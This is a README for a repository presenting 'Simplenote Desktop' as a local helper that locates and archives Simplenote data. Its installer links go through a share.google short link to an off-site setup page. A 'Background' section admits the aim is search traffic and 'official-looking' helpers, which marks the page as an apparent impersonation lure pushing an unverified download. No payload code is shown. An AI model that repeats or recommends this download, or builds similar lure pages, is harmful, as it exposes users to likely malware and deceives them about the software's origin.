![Simplenote Desktop](assets/hero.png)

# Simplenote Desktop

*Find the Simplenote folder fast and keep a local spare.*

## About

**Simplenote Desktop** runs on your own PC. Local Windows and macOS helper for Simplenote data paths, config and export caches, and export folders.

Patches move Simplenote data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Locates Simplenote user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Simplenote is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/logareed-9951/simplenote-desktop

MIT license. See `LICENSE`.
